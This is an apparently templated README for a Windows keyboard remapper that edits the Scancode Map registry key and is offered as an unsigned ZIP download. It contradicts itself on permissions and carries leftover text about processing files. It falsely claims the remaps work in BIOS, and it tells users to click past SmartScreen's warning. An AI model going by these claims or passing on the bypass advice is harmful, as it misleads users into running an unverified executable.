<p align="center">
  <img src="https://i.postimg.cc/3Jc8wF3T/banner.png" alt="KeySwap Keyboard Remapper — Native Windows Scancode Key Remap With 1-Click Reset" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Keyboard%20Remapper-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-keyswap--v1.2-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# KeySwap Keyboard Remapper — Native Windows Scancode Key Remap With 1-Click Reset

**Want to turn useless CapsLock into Ctrl or Esc, swap Left Win and Left Alt on a Mac-layout keyboard, or remap a broken laptop key without running heavy macro software that triggers game anti-cheats? Remap keys natively at the Windows driver level.**

KeySwap Keyboard Remapper provides a clean visual keyboard mapper for Windows' built-in `Scancode Map` registry feature: **translating key scancodes inside the Windows HID keyboard driver itself so remaps work in every game, UAC prompt, and login screen with 0% CPU usage**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) developers, gamers, and laptop users** who want clean single-key remapping without background macro daemons.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Accidental CapsLock presses in games or coding | CapsLock sits in prime pinky territory with little everyday use | Remap `CapsLock` → `Left Ctrl`, `Backspace`, or `Escape` |
| Using a Mac-layout mechanical keyboard on Windows | `Win` and `Alt` keys sit in reversed positions | Swap `Left Win` ↔ `Left Alt` cleanly at the driver level |
| Laptop keyboard has a dead `PageDown` or `Right Ctrl` key | Hardware key failure blocks navigation shortcuts | Reassign an unused key (`ScrollLock` / `Pause`) to replace the broken key |
| Software macro tools fail in Admin apps or trigger anti-cheat | User-mode keyboard hooks get blocked by elevated windows & anti-cheat | Use native Windows `Scancode Map` (zero background process, 100% compatible) |

## Download for Windows

[**Download KeySwapTray.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/KeySwapTray.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `KeySwapTray.exe`? (Key features)

- Visual 'Press Key to Capture' picker—no hex scancode tables to memorize.
- Writes standard Windows `HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout\Scancode Map` entries.
- Consumes **0 MB RAM and 0% CPU** after applying because Windows handles mapping natively in the keyboard driver.
- Includes automatic `.reg` backup and a 1-click **Restore Default Keyboard** button.

### Sample Output

```text
[KeySwap] Active Windows Scancode Map Entries:
[OK]   Mapping [1]      : CapsLock (0x003A)  --->  Left Ctrl (0x001D)
[OK]   Mapping [2]      : ScrollLock (0x0046) --->  PrintScreen (0xE037)
[INFO] Background Load  : 0 processes required (Native Windows HID driver mapping)
```

The release ZIP is named `KeySwapTray.zip`; the Windows executable inside is named `KeySwapTray.exe`.

1. Close KeySwap before updating or replacing executable files.
2. Click **Download KeySwapTray.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `KeySwapTray.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit); requires sign-out or reboot for Windows to reload `Scancode Map`.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `KeySwapTray.exe` runs locally without uploading your files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Zero background processes or anti-cheat conflicts

Because `Scancode Map` is an official Windows feature built into `kbdclass.sys`, it works everywhere—including login screens, BIOS/admin prompts, and competitive games.

### No manual little-endian binary hex math

Writing `Scancode Map` binary values by hand in `regedit` is notoriously error-prone; KeySwap encodes the exact header, count, and null terminator automatically.

### Instant rollback to stock keyboard layout

One click removes `Scancode Map` and restores default keys.

### Portable single-file utility

Close KeySwap completely after applying your mappings.

## Default folders and configuration paths

KeySwap configures Windows' native `Keyboard Layout` registry key and saves a `.reg` backup in `%APPDATA%\KeySwap`:

```text
HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout\Scancode Map
```

Typical directory layout:

```text
Windows Keyboard Driver (kbdclass.sys)
└── HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout\Scancode Map
    ├── Backup : %APPDATA%\KeySwap\backup_layout.reg
    └── Reset  : 1-Click Delete Scancode Map
```

Windows reads `Scancode Map` when initializing user sessions—sign out and sign back in (or reboot) after applying changes.

## Quick start guide

Follow these steps to get started:

1. **Extract `KeySwapTray.zip` and run `KeySwapTray.exe`.** Approve the UAC prompt to write to `HKLM\...\Keyboard Layout`.
2. **Click **Add Mapping**, press the **Source Key** on your keyboard, then press the **Target Key**.** Verify the mapping appears in the active list.
3. **Click **Apply Mappings**.** KeySwap automatically exports a backup `.reg` file first.
4. **Sign out of Windows and sign back in (or restart).** Your remapped keys are now active system-wide with zero background apps.

### Data safety note

Use the **Restore Default Keyboard** button anytime to remove all custom key remappings.

## What the status summary shows

KeySwap displays **all active scancode pairs, hex codes, backup status, and reboot/sign-out reminder**.

## FAQ

**Does KeySwap need to stay running in the background?**

No. Once applied and you sign out/in, Windows handles the remapping natively at the driver level with zero background processes.

**Will this trigger anti-cheat in games?**

No—`Scancode Map` is a standard Windows accessibility/layout registry feature that performs 1-to-1 key swaps without macros.

**How do I reset my keyboard back to normal?**

Open KeySwap, click 'Restore Default Keyboard', and sign out/in.

## Useful reading

- [Microsoft Docs — Scan Code Mapper for Windows](https://learn.microsoft.com/en-us/windows-hardware/drivers/hid/keyboard-and-mouse-class-drivers)

## More Windows Desktop Utilities

- [PadDrift-ControllerPollingTest](../PadDrift-ControllerPollingTest) — Gamepad stick drift & mouse polling rate (1000-8000 Hz) tester
- [PinTop-WindowAlwaysOnTop](../PinTop-WindowAlwaysOnTop) — Pin any window Always-on-Top & adjust transparency on Windows
- [ClipVault-OfflineClipboardHistory](../ClipVault-OfflineClipboardHistory) — Offline Windows clipboard history & plain-text snippet manager
- [AudioSwitch-HotkeyToggle](../AudioSwitch-HotkeyToggle) — One-key headphones, speakers & microphone switcher

*Independent open-source desktop utility for Windows.*
